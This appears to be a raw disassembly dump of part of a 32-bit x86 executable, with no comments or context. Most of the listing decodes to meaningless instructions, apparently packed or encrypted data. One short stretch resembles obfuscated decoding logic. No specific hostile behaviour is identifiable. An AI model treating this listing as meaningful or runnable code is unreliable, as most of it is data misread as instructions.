  4059ac:	pop    ebx
  4059ad:	and    cl,ah
  4059af:	mov    WORD PTR [ecx+0x77bff4d5],ss
  4059b5:	dec    edi
  4059b6:	shl    BYTE PTR [esi],1
  4059b8:	dec    ebp
  4059b9:	mov    cl,0xed
  4059bb:	cli    
  4059bc:	xchg   DWORD PTR [ecx+0x56],ebx
  4059bf:	or     esp,DWORD PTR [ecx-0x1e]
  4059c2:	stc    
  4059c3:	xor    edi,0x6d94107a
  4059c9:	in     eax,dx
  4059ca:	ret    0xf20c
  4059cd:	jle    0xe5bfd5f4
  4059d3:	fisubr WORD PTR [esi-0x4008bd2d]
  4059d9:	stos   DWORD PTR es:[edi],eax
  4059da:	lahf   
  4059db:	dec    edx
  4059dc:	rcr    BYTE PTR [ecx-0x20],cl
  4059df:	(bad)  
  4059e0:	sbb    edi,DWORD PTR [edi]
  4059e2:	pushf  
  4059e3:	pop    es
  4059e4:	jmp    0x4059eb
  4059e6:	in     eax,dx
  4059e7:	xchg   edx,eax
  4059e8:	hlt    
  4059e9:	mov    bh,BYTE PTR [edi+edx*4]
  4059ec:	xor    ebx,DWORD PTR [ecx-0x424e9e22]
  4059f2:	out    dx,eax
  4059f3:	lahf   
  4059f4:	adc    al,0x98
  4059f6:	out    dx,eax
  4059f7:	push   ebp
  4059f8:	mov    ch,0xef
  4059fa:	stc    
  4059fb:	outs   dx,BYTE PTR ds:[esi]
  4059fc:	and    al,0x38
  4059fe:	test   al,0x94
  405a00:	or     al,0x25
  405a02:	pop    ebp
  405a03:	(bad)  
  405a04:	cwde   
  405a05:	cmp    eax,0xaba92147
  405a0a:	mov    al,BYTE PTR [eax-0x61]
  405a0d:	jo     0x405a63
  405a0f:	out    0xc2,eax
  405a11:	push   esp
  405a12:	jb     0x405a69
  405a14:	xchg   edi,eax
  405a15:	rcl    BYTE PTR [edi-0x45],0x49
  405a19:	iret   
  405a1a:	xor    ebx,esp
  405a1c:	xor    ah,BYTE PTR [ecx+0xd41b868]
  405a22:	cmc    
  405a23:	dec    ecx
  405a24:	and    eax,0x5be5cf24
  405a29:	or     ch,BYTE PTR [esi]
  405a2b:	xor    BYTE PTR [esi+0x16],ah
  405a2e:	cwde   
  405a2f:	xchg   ebx,eax
  405a30:	push   0xc3bea699
  405a35:	repnz sti 
  405a37:	scas   eax,DWORD PTR es:[edi]
  405a38:	aad    0x6e
  405a3a:	in     eax,dx
  405a3b:	xchg   esp,eax
  405a3c:	icebp  
  405a3d:	loop   0x405a56
  405a3f:	ins    BYTE PTR es:[edi],dx
  405a40:	push   esp
  405a41:	sahf   
  405a42:	pop    ebx
  405a43:	sbb    dl,BYTE PTR [edi-0x58]
  405a46:	int    0x1a
  405a48:	jo     0x405a85
  405a4a:	shl    BYTE PTR [edx],1
  405a4c:	adc    dl,ah
  405a4e:	mov    al,ds:0x3cd5db99
  405a53:	and    ch,BYTE PTR ds:0xc26c981f
  405a59:	sub    bh,al
  405a5b:	mov    bl,0xd8
  405a5d:	or     BYTE PTR [edi-0x53d7a748],dl
  405a63:	push   cs
  405a64:	(bad)  
  405a65:	mov    esp,0x33d00e68
  405a6a:	push   ecx
  405a6b:	xchg   ebp,eax
  405a6c:	test   eax,0xaa345709
  405a71:	sbb    DWORD PTR [eax+0x41c68c42],ebp
  405a77:	test   BYTE PTR [ebx+eax*8+0x23],0x61
  405a7c:	pushf  
  405a7d:	call   0xed6d:0x6bc39e1d
  405a84:	stc    
  405a85:	(bad)  [ecx-0xe]
  405a88:	mov    al,ds:0xcd42e640
  405a8d:	ins    DWORD PTR es:[edi],dx
  405a8e:	and    al,0xcd
  405a90:	mov    eax,0xdb9c76ae
  405a95:	adc    BYTE PTR [eax+0x30ff48b4],al
  405a9b:	cld    
  405a9c:	repz push edx
  405a9e:	jae    0x405a36
  405aa0:	ins    DWORD PTR es:[edi],dx
  405aa1:	cmp    eax,0x601417b1
  405aa6:	rcl    BYTE PTR [ecx-0x74],cl
  405aa9:	in     eax,0x49
  405aab:	call   0xc8ed:0xb1764ab7
  405ab2:	aas    
  405ab3:	daa    
  405ab4:	or     ebx,0xcfc1045b
  405aba:	call   0xd59c:0xec982197
  405ac1:	cmp    ebx,DWORD PTR [edi]
  405ac3:	xlat   BYTE PTR ds:[ebx]
  405ac4:	sub    bh,ah
  405ac6:	mov    ds:0x26c0c9d2,eax
  405acb:	or     al,0x74
  405acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ace:	mov    ecx,0xe607a69e
  405ad3:	push   ebx
  405ad4:	sar    BYTE PTR [ecx-0x7fcee66d],1
  405ada:	dec    ebp
  405adb:	or     eax,0x2e7dd5ab
  405ae0:	mov    bh,0xb9
  405ae2:	jb     0x405a77
  405ae4:	sbb    edx,esi
  405ae6:	mov    DWORD PTR [ebp+0x7894f5f0],edx
  405aec:	dec    esi
  405aed:	sub    al,dh
  405aef:	sbb    BYTE PTR [ebp-0x52],bh
  405af2:	(bad)  
  405af3:	daa    
  405af4:	jns    0x405b6d
  405af6:	pop    edx
  405af7:	sub    eax,0xa3d3874
  405afc:	jle    0x98df337b
  405b02:	fwait
  405b03:	ins    DWORD PTR es:[edi],dx
  405b04:	and    edi,ebx
  405b06:	sti    
  405b07:	sbb    BYTE PTR [ecx-0x1379012a],bh
  405b0d:	mov    ah,0x28
  405b0f:	adc    BYTE PTR [edi+0x8],0x56
  405b13:	and    dl,dh
  405b15:	inc    eax
  405b16:	jg     0x405b83
  405b18:	xor    ebx,DWORD PTR [ebx-0x61]
  405b1b:	pop    es
  405b1c:	mov    ebx,0x5de5f6e2
  405b21:	push   0xd812bea1
  405b26:	dec    ebx
  405b27:	mov    edx,0x86ced88f
  405b2c:	sar    dl,0xa8
  405b2f:	(bad)  
  405b31:	sbb    al,0x89
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x27fe9455
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405bcc
  405be0:	lock sbb bh,BYTE PTR [esi-0x6b]
  405be4:	hlt    
  405be5:	jmp    0x405b78
  405be7:	cmp    al,0x8a
  405be9:	enter  0x94cf,0x70
  405bed:	inc    DWORD PTR [edx+ecx*4-0x7ec83127]
  405bf4:	add    DWORD PTR ds:0x6bf57149,esp
  405bfa:	fdivr  QWORD PTR [ebx-0x34103abc]
  405c00:	jo     0x405c6c
  405c02:	gs pop ecx
  405c04:	je     0x405c18
  405c06:	in     eax,dx
  405c07:	xchg   edi,eax
  405c08:	repz mov dh,0xb
  405c0b:	sub    DWORD PTR [ebp-0x6b],edx
  405c0e:	dec    esp
  405c0f:	out    dx,eax
  405c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c11:	mov    esp,0x24966839
  405c16:	jg     0x405bcf
  405c18:	mov    ds,WORD PTR [eax]
  405c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c1b:	fld    DWORD PTR [eax+0x25a0516]
  405c21:	jp     0x405baf
  405c23:	xlat   BYTE PTR ds:[ebx]
  405c24:	or     DWORD PTR [edi],eax
  405c26:	pop    edi
  405c27:	mov    al,0xe7
  405c29:	iret   
  405c2a:	fisttp QWORD PTR [ebx+0x76]
  405c2d:	jnp    0x405be1
  405c2f:	mov    ebx,0x2e70bddd
  405c34:	pop    DWORD PTR [eax-0x27]
  405c37:	sbb    dh,al
  405c39:	mov    ebx,0x248d9aad
  405c3e:	shl    BYTE PTR [eax+0x6155ee67],cl
  405c44:	add    cl,BYTE PTR [eax+ecx*1-0x37d31706]
  405c4b:	shl    BYTE PTR [eax],cl
  405c4d:	(bad)  
  405c4e:	xchg   edi,eax
  405c4f:	jmp    esp
  405c51:	pop    ss
  405c52:	xchg   esp,eax
  405c53:	repz ficom DWORD PTR [ebx-0x50]
  405c57:	jne    0x405cab
  405c59:	xchg   ebp,eax
  405c5a:	dec    esi
  405c5b:	shl    DWORD PTR [edx+0x2ff673b3],cl
  405c61:	mov    ds:0xa75ac7c7,eax
  405c66:	xor    bl,cl
  405c68:	adc    eax,0xb1836005
  405c6d:	shl    ecx,cl
  405c6f:	ds inc eax
  405c71:	xchg   BYTE PTR [edx],al
  405c73:	or     BYTE PTR [edi],dl
  405c75:	ficom  WORD PTR [edi-0x24]
  405c78:	mov    eax,0x6c612e85
  405c7d:	stos   DWORD PTR es:[edi],eax
  405c7e:	add    dh,BYTE PTR [edi-0x14]
  405c81:	out    dx,al
  405c82:	leave  
  405c83:	cmp    ecx,DWORD PTR [esi+eiz*8]
  405c86:	pop    ebx
  405c87:	popa   
  405c88:	inc    esp
  405c89:	ret    0xee0c
  405c8c:	add    ah,ch
  405c8e:	test   eax,0xfd3356c7
  405c93:	ins    BYTE PTR es:[edi],dx
  405c94:	jmp    edi
  405c96:	adc    ecx,DWORD PTR [ebx-0x4d]
  405c99:	les    ebp,FWORD PTR [esi+0x21f1c698]
  405c9f:	(bad)  
  405ca0:	and    eax,0xd6bfcf13
  405ca5:	ins    DWORD PTR es:[edi],dx
  405ca6:	shr    ah,cl
  405ca8:	sbb    BYTE PTR [edx],cl
  405caa:	sub    esi,DWORD PTR cs:[esi-0x52]
  405cae:	pop    esp
  405caf:	jecxz  0x405c60
  405cb1:	repnz mov edx,0x26aeabff
  405cb7:	fcmovu st,st(2)
  405cb9:	push   0x4c013f03
  405cbe:	loopne 0x405d13
  405cc0:	faddp  st(1),st
  405cc2:	dec    ebx
  405cc3:	std    
  405cc4:	dec    ecx
  405cc5:	sbb    edi,DWORD PTR [ecx-0x79]
  405cc8:	int    0x20
  405cca:	cmp    eax,0x6bcb3931
  405ccf:	inc    eax
  405cd0:	hlt    
  405cd1:	fsubr  DWORD PTR [edx-0x60]
  405cd4:	mov    BYTE PTR [ebx+esi*2-0x69eddb6b],bl
  405cdb:	pop    edi
  405cdc:	icebp  
  405cdd:	pop    eax
  405cde:	push   ds
  405cdf:	rcr    DWORD PTR [edx],0x44
  405ce2:	pop    edx
  405ce3:	pusha  
  405ce4:	mov    dl,0x75
  405ce6:	inc    ebp
  405ce7:	arpl   WORD PTR [esi+0x7d3c9811],bx
  405ced:	mov    esi,DWORD PTR [ecx-0x758d6ded]
  405cf3:	mov    edx,0x9a48124c
  405cf8:	cmc    
  405cf9:	mov    ebp,0x3370b4df
  405cfe:	(bad)  
  405d01:	jbe    0x405c91
  405d03:	shl    eax,0xd2
  405d06:	fstp   TBYTE PTR [edi-0x73]
  405d09:	mov    eax,ds:0xc84fb386
  405d0e:	cmc    
  405d0f:	lea    eax,[edi+0x32207d72]
  405d15:	and    eax,0x9a366fe4
  405d1a:	call   0x8bffb450
  405d1f:	cmp    DWORD PTR [ebx],edx
  405d21:	fnstenv [ecx+0xdfd7d2d]
  405d27:	in     al,0x82
  405d29:	icebp  
  405d2a:	add    edx,DWORD PTR [ebx+0x14280e25]
  405d30:	(bad)  
  405d31:	push   0x5f
  405d33:	leave  
  405d34:	adc    BYTE PTR gs:[esi+0x1b],bl
  405d38:	cmp    esp,ebp
  405d3a:	psadbw mm5,mm4
  405d3d:	ss inc ecx
  405d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d40:	retf   
  405d41:	iret   
  405d42:	loop   0x405d4c
  405d44:	iret   
  405d45:	jns    0x405d1a
  405d47:	daa    
  405d48:	(bad)  [edx+0x7df121c8]
  405d4e:	test   eax,0x1e05d8
  405d53:	stos   BYTE PTR es:[edi],al
  405d54:	out    0x2c,eax
  405d56:	cmp    DWORD PTR [ebx],0xb72de3f1
  405d5c:	fcom   DWORD PTR [edi]
  405d5e:	test   BYTE PTR [ebx-0x51],bh
  405d61:	mov    DWORD PTR ds:0xfc784cb,ebp
  405d67:	aam    0xba
  405d69:	add    bl,BYTE PTR [ebx-0x6c5c783d]
  405d6f:	jne    0x405cf7
  405d71:	out    dx,eax
  405d72:	ds out 0x64,eax
  405d75:	push   edi
  405d76:	shl    BYTE PTR [esi],cl
  405d78:	sbb    BYTE PTR [esi-0x23f12168],0x9a
  405d7f:	nop
  405d80:	mov    dx,es
  405d83:	lods   eax,DWORD PTR ds:[esi]
  405d84:	loop   0x405d5b
  405d86:	outs   dx,BYTE PTR ds:[esi]
  405d87:	mov    ebp,0x7cc04121
  405d8c:	jl     0x405d58
  405d8e:	(bad)  
  405d8f:	aas    
  405d90:	adc    DWORD PTR ds:0xb8c84ef5,eax
  405d96:	popf   
  405d97:	rcr    BYTE PTR [edx+0x15],1
  405d9a:	test   al,0x9a
  405d9c:	mov    al,ds:0x8445adbe
  405da1:	xchg   esp,eax
  405da2:	test   DWORD PTR [edi+edi*4+0x36],0x805a6d25
  405daa:	mov    esp,DWORD PTR [edx]
  405dac:	cmp    cl,BYTE PTR [ecx]
  405dae:	adc    ebp,DWORD PTR [esi+0x45363117]
  405db4:	jge    0x405dcf
  405db6:	ins    DWORD PTR es:[edi],dx
  405db7:	pushf  
  405db8:	pop    ebp
  405db9:	outs   dx,BYTE PTR ds:[esi]
  405dba:	push   cs
  405dbb:	cmp    ch,BYTE PTR [ebx]
  405dbd:	mov    ebx,0xe49ff8d8
  405dc2:	dec    ecx
  405dc3:	cmp    BYTE PTR [esi+0x15c06550],bh
  405dc9:	or     ah,BYTE PTR [edi-0xa]
  405dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dcd:	or     al,0x81
  405dcf:	icebp  
  405dd0:	cmp    BYTE PTR [ebx+0x12e23428],0x81
  405dd7:	dec    eax
  405dd8:	add    ch,BYTE PTR [eax+0x2a]
  405ddb:	mov    edi,0x1d1a06a8
  405de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de1:	fs sub eax,0x210da558
  405de7:	jp     0x405da4
  405de9:	xchg   edi,eax
  405dea:	in     al,0xd7
  405dec:	mov    ecx,0x289b26b2
  405df1:	pop    ss
  405df2:	push   ebp
  405df3:	pop    esi
  405df4:	xor    BYTE PTR [ebp+eiz*4+0x6d],al
  405df8:	dec    esp
  405df9:	test   al,0x5c
  405dfb:	shr    BYTE PTR [ecx+0x4d98bc91],1
  405e01:	lods   al,BYTE PTR ds:[esi]
  405e02:	mov    al,0xfc
  405e04:	adc    BYTE PTR [eax],bl
  405e06:	test   BYTE PTR [ecx-0x329e61c8],ch
  405e0c:	imul   esp,DWORD PTR [ecx+0x41],0xffffffb1
  405e10:	and    eax,DWORD PTR [esi+ebp*4-0x645c3209]
  405e17:	cmp    eax,0x6dbced4
  405e1c:	in     al,0x11
  405e1e:	inc    esi
  405e1f:	aaa    
  405e20:	aad    0x97
  405e22:	shl    DWORD PTR [ecx],0xa1
  405e25:	add    eax,esi
  405e27:	sbb    eax,0x32c4d4
  405e2c:	into   
  405e2d:	mov    ecx,0xc9f3bb86
  405e32:	out    dx,al
  405e33:	sbb    al,BYTE PTR [edi-0x36]
  405e36:	mov    WORD PTR [ecx*1+0x161080b1],es
  405e3d:	fiadd  DWORD PTR [ecx-0x5b50a387]
  405e43:	lea    ecx,[ecx]
  405e45:	rol    ah,1
  405e47:	adc    BYTE PTR [eax+0x18],dh
  405e4a:	push   edx
  405e4b:	lods   al,BYTE PTR ds:[esi]
  405e4c:	jg     0x405de0
  405e4e:	neg    BYTE PTR [edi+ebx*4]
  405e51:	or     edi,edi
  405e53:	in     eax,dx
  405e54:	push   edx
  405e55:	sbb    DWORD PTR [ebp+0x279538be],ecx
  405e5b:	add    BYTE PTR [ecx+0x5ad107fd],0x7a
  405e62:	mov    esp,DWORD PTR [ebx-0x7]
  405e65:	add    al,0x81
  405e67:	mov    ah,0x3c
  405e69:	jg     0x405ed2
  405e6b:	push   ebx
  405e6c:	div    DWORD PTR [edx+eax*4-0x6e4aee7]
  405e73:	scas   al,BYTE PTR es:[edi]
  405e74:	imul   ebx,DWORD PTR [ebp+0x5e],0x57
  405e78:	repnz pop ss
  405e7a:	jne    0x405e6a
  405e7c:	sbb    eax,0x228f7b56
  405e81:	push   esp
  405e82:	push   esp
  405e83:	bound  ebp,QWORD PTR [ebx+edi*4-0x4e]
  405e87:	adc    eax,DWORD PTR [eax]
  405e89:	les    ebx,FWORD PTR [eax+0x367350ca]
  405e8f:	(bad)  
  405e90:	mov    al,ds:0xe6509b38
  405e95:	ja     0x405f14
  405e97:	ins    DWORD PTR es:[edi],dx
  405e98:	mov    edi,0x1e5bbb9b
  405e9d:	jne    0x405e66
  405e9f:	fisub  WORD PTR [ebx+esi*2+0x37]
  405ea3:	int    0x1f
  405ea5:	shl    DWORD PTR [esi],1
  405ea7:	fist   DWORD PTR [edx-0x76]
  405eaa:	nop
  405eab:	add    al,0xb3
  405ead:	loop   0x405ebb
  405eaf:	pop    ebp
  405eb0:	(bad)  
  405eb1:	call   0x27c811a6
  405eb6:	outs   dx,BYTE PTR ds:[esi]
  405eb7:	sub    al,0x57
  405eb9:	or     BYTE PTR [esi-0x7f15745f],ah
  405ebf:	cwde   
  405ec0:	int    0x37
  405ec2:	mov    ds:0xa61348bf,eax
  405ec7:	scas   eax,DWORD PTR es:[edi]
  405ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ec9:	mov    ebx,0xc195871b
  405ece:	outs   dx,DWORD PTR ds:[esi]
  405ecf:	dec    ebx
  405ed0:	jmp    0x8fbb:0x1a2e6757
  405ed7:	(bad)  
  405ed8:	cs pop edi
  405eda:	inc    ebp
  405edb:	mov    dh,0xb9
  405edd:	mov    ecx,0x85aeda9
  405ee2:	imul   ecx,DWORD PTR [esi-0x2b],0xec9ec06b
  405ee9:	cmp    al,ch
  405eeb:	push   ecx
  405eec:	sub    BYTE PTR [ebp+0x58],al
  405eef:	xchg   DWORD PTR [esi+0x32d4891a],ebp
  405ef5:	mov    cl,0x3e
  405ef7:	(bad)  [ebx]
  405ef9:	and    al,0x4a
  405efb:	je     0x405f0e
  405efd:	ret    0xf2f7
  405f00:	js     0x405f3e
  405f02:	stc    
  405f03:	cmp    ah,al
  405f05:	mov    gs,WORD PTR [esi]
  405f07:	lock ficomp WORD PTR [edx+ebx*4-0x6c]
  405f0c:	popf   
  405f0d:	or     dl,BYTE PTR [esp+edi*1+0x32]
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [edi-0x59aeeaf7],ds
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	test   eax,0x526f85c
  405f37:	es push 0x6e45bd2f
  405f3d:	in     eax,0x5b
  405f3f:	mov    bh,0x13
  405f41:	fxch   st(4)
  405f43:	fstp   TBYTE PTR [edi]
  405f45:	push   esp
  405f46:	xor    ah,bh
  405f48:	pop    ebp
  405f49:	out    dx,eax
  405f4a:	adc    ecx,esi
  405f4c:	aam    0x52
  405f4e:	fild   DWORD PTR [esi-0x163cadcb]
  405f54:	repnz pushf 
  405f56:	sub    eax,0xc84d527a
  405f5b:	test   ax,0x39cf
  405f5f:	in     eax,0x5b
  405f61:	pop    ecx
  405f62:	js     0x405f62
  405f64:	js     0x405f5b
  405f66:	mov    ds:0x74c0b650,eax
  405f6b:	adc    ch,dl
  405f6d:	(bad)  
  405f6e:	adc    edi,esp
  405f70:	or     al,0xa1
  405f72:	mov    BYTE PTR [edi],bh
  405f74:	(bad)  
  405f75:	mov    ch,0xbb
  405f77:	pop    edx
  405f78:	add    DWORD PTR [ecx-0x3d],ecx
  405f7b:	int    0x67
  405f7d:	sub    eax,0x14ae3227
  405f82:	add    ah,BYTE PTR [ebx]
  405f84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f85:	lahf   
  405f86:	stc    
  405f87:	sbb    edx,DWORD PTR ds:0x42641347
  405f8d:	repz push ebx
  405f8f:	sar    BYTE PTR [ebx],0xde
  405f92:	test   DWORD PTR [eax],ebp
  405f94:	mov    cl,0xbc
  405f96:	(bad)  
  405f97:	neg    edi
  405f99:	dec    edi
  405f9a:	imul   ecx
  405f9c:	or     DWORD PTR [edx+0x4c],eax
  405f9f:	test   eax,0x7dd2716d
  405fa4:	call   0xa4cb5fe7
  405fa9:	ficomp WORD PTR [ebx-0x5256bdce]
  405faf:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  405fb1:	std    
  405fb2:	xlat   BYTE PTR ds:[ebx]
  405fb3:	mov    dh,0xe9
  405fb5:	push   ebx
  405fb6:	pop    es
  405fb7:	cmp    al,0xb2
  405fb9:	dec    ecx
  405fba:	pop    ds
  405fbb:	or     BYTE PTR [esi-0x2d05c815],dl
  405fc1:	imul   ebp,DWORD PTR [ebx],0xb0d500d7
  405fc7:	jnp    0x405fa0
  405fc9:	js     0x405ff4
  405fcb:	sbb    BYTE PTR [edi-0x61866437],dh
  405fd1:	lock pop esp
  405fd3:	mov    DWORD PTR [ecx],edx
  405fd5:	mov    bl,0x7
  405fd7:	out    dx,eax
  405fd8:	es test al,0x48
  405fdb:	dec    edx
  405fdc:	pop    esp
  405fdd:	jp     0x405f7b
  405fdf:	test   BYTE PTR [edx+0x1e],0x1a
  405fe3:	mov    ds,WORD PTR [edi+ebx*8+0x30]
  405fe7:	jbe    0x405fec
  405fe9:	and    BYTE PTR [edi],ah
  405feb:	and    eax,0x85969c40
  405ff0:	jl     0x40605f
  405ff2:	cdq    
  405ff3:	or     BYTE PTR [esi],ah
  405ff5:	sub    DWORD PTR [esi-0x4f],0xffffff89
  405ff9:	fsub   DWORD PTR [ebx-0x56]
  405ffc:	inc    eax
  405ffd:	xchg   esp,eax
  405ffe:	ror    DWORD PTR [esi],0xae
  406001:	xor    ebx,DWORD PTR [edi+edx*4-0x73]
  406005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406006:	dec    ebx
  406007:	pushf  
  406008:	ins    BYTE PTR es:[edi],dx
  406009:	in     eax,dx
  40600a:	mov    ds:0xaef4e960,al
  40600f:	xor    ecx,DWORD PTR ds:0x659827f0
  406015:	mov    al,0xd7
  406017:	jo     0x405fb8
  406019:	cmc    
  40601a:	mov    bl,0x41
  40601c:	popf   
  40601d:	lahf   
  40601e:	mov    cl,0x7a
  406020:	add    eax,0x24972b27
  406025:	fdivr  DWORD PTR [eax+0x65c9f765]
  40602b:	mov    WORD PTR [eax+0x44],ds
  40602e:	push   ss
  40602f:	mov    WORD PTR [edi+0x5954f20],?
  406035:	inc    ecx
  406036:	jl     0x40600a
  406038:	leave  
  406039:	inc    eax
  40603a:	mov    bl,0x7f
  40603c:	cs push ss
  40603e:	adc    edx,edi
  406040:	sbb    BYTE PTR [ebx+0x37790188],0x3c
  406047:	mov    esi,0xace4219
  40604c:	cmc    
  40604d:	sub    dl,BYTE PTR [ebx]
  40604f:	adc    dl,ch
  406051:	das    
  406052:	mov    ecx,ebp
  406054:	push   0x3115d362
  406059:	call   FWORD PTR [ebx]
  40605b:	or     cl,BYTE PTR [eax]
  40605d:	dec    eax
  40605e:	add    ah,bh
  406060:	lds    edi,FWORD PTR [edi+edi*4+0x49]
  406064:	cmp    eax,0x14b8cf0b
  406069:	fisub  DWORD PTR [ebx-0x4]
  40606c:	push   ds
  40606d:	xor    al,0x71
  40606f:	fsubr  DWORD PTR [eax+0x44]
  406072:	fs mov ebx,0xdbb85626
  406078:	add    DWORD PTR [ebx+0x110326ec],0x64
  40607f:	jb     0x406042
  406081:	xor    al,0x0
  406083:	popf   
  406084:	push   ebp
  406085:	pop    edx
  406086:	mov    bh,0xf1
  406088:	inc    ecx
  406089:	outs   dx,BYTE PTR ds:[esi]
  40608a:	pop    eax
  40608b:	in     eax,dx
  40608c:	sub    ebp,ebp
  40608e:	icebp  
  40608f:	aam    0xe4
  406091:	sbb    ebx,esi
  406093:	les    edx,FWORD PTR [esi+0x11]
  406096:	inc    ebx
  406097:	fsubr  DWORD PTR [edi+0x674112c5]
  40609d:	mov    BYTE PTR [esi-0x5fbde166],cl
  4060a3:	test   bl,ah
  4060a5:	mov    eax,ds:0x9a1217a6
  4060aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ab:	push   0xffffffbe
  4060ad:	sti    
  4060ae:	or     bh,BYTE PTR [esi]
  4060b0:	(bad)  
  4060b1:	setnp  ah
  4060b4:	loopne 0x406119
  4060b6:	sub    cl,BYTE PTR ds:0x77bed8bd
  4060bc:	aaa    
  4060bd:	dec    eax
  4060be:	xchg   edi,eax
  4060bf:	xor    ecx,DWORD PTR [ecx+0x24d7182e]
  4060c5:	shr    BYTE PTR [edi-0x75],1
  4060c8:	ficomp DWORD PTR ss:[esi+0x25]
  4060cc:	mov    dh,0x3f
  4060ce:	sbb    eax,0xbdd5071f
  4060d3:	ret    
  4060d4:	popf   
  4060d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d6:	or     ch,BYTE PTR [eax+0x43]
  4060d9:	ficomp DWORD PTR [eax]
  4060db:	in     al,dx
  4060dc:	stos   BYTE PTR es:[edi],al
  4060dd:	aad    0x46
  4060df:	in     al,0x1a
  4060e1:	in     eax,dx
  4060e2:	(bad)  
  4060e3:	retf   
  4060e4:	aas    
  4060e5:	or     DWORD PTR [esi],ebp
  4060e7:	jmp    0x32346614
  4060ec:	mov    esp,0x67a7077a
  4060f1:	pop    ebx
  4060f2:	seta   bh
  4060f5:	cmp    cl,BYTE PTR [ebp+0x19]
  4060f8:	dec    edi
  4060f9:	cdq    
  4060fa:	cli    
  4060fb:	push   ecx
  4060fc:	mov    BYTE PTR [eax+ecx*1-0x78822b84],ah
  406103:	jae    0x4060a4
  406105:	jb     0x406170
  406107:	or     eax,0x63f4be2b
  40610c:	dec    esp
  40610d:	mov    ds:0xfdd830ff,al
  406112:	xlat   BYTE PTR ds:[ebx]
  406113:	inc    esp
  406114:	cmp    eax,0x280ec3b8
  406119:	push   ebp
  40611a:	sbb    ebp,DWORD PTR [eax]
  40611c:	stc    
  40611d:	retf   0x613a
  406120:	sub    DWORD PTR [edx+0x5e],ebx
  406123:	ficomp WORD PTR [edx+0x1433ed04]
  406129:	push   eax
  40612a:	nop
  40612b:	ss std 
  40612d:	or     al,0x8c
  40612f:	xchg   ecx,eax
  406130:	jae    0x40610e
  406132:	xchg   BYTE PTR [ebx+0x58a320ff],al
  406138:	push   esp
  406139:	add    ah,cl
  40613b:	sub    eax,0x3948c3ad
  406140:	fisttp DWORD PTR [ebx-0x1fe8c628]
  406146:	xor    esp,DWORD PTR [eax+ecx*8-0x7a]
  40614a:	xchg   ecx,eax
  40614b:	scas   al,BYTE PTR es:[edi]
  40614c:	pop    es
  40614d:	test   al,0xec
  40614f:	arpl   di,dx
  406151:	jmp    0xd58a:0x44b568ee
  406158:	mov    ch,0xb4
  40615a:	add    al,0x15
  40615c:	jmp    0x40615d
  40615e:	out    0xcb,al
  406160:	ror    DWORD PTR [ecx-0x1405882c],0xe6
  406167:	das    
  406168:	fstp   TBYTE PTR [ebx-0x2f]
  40616b:	loopne 0x40619e
  40616d:	sub    eax,0x1dfce3e6
  406172:	test   edi,eax
  406174:	xor    dl,cl
  406176:	pop    ecx
  406177:	in     eax,dx
  406178:	pop    eax
  406179:	fistp  WORD PTR [eax-0x77]
  40617c:	xor    ch,dl
  40617e:	out    dx,al
  40617f:	xchg   DWORD PTR [ecx],edi
  406181:	retf   0x3d66
  406184:	pop    ds
  406185:	cmp    al,0xe0
  406187:	les    esp,FWORD PTR [ecx-0x43]
  40618a:	inc    esi
  40618b:	in     eax,dx
  40618c:	fisub  WORD PTR [esi]
  40618e:	mov    ebp,0x83eaa7a3
  406193:	iret   
  406194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406195:	icebp  
  406196:	scas   eax,DWORD PTR es:[edi]
  406197:	call   DWORD PTR [edi+0x13]
  40619a:	fmul   st,st(0)
  40619c:	push   0xffffffa4
  40619e:	outs   dx,DWORD PTR ds:[esi]
  40619f:	xor    ebx,DWORD PTR [edx]
  4061a1:	sub    bh,BYTE PTR [edx+0x3b]
  4061a4:	pusha  
  4061a5:	sbb    BYTE PTR [edi],cl
  4061a7:	push   esi
  4061a8:	xchg   ecx,eax
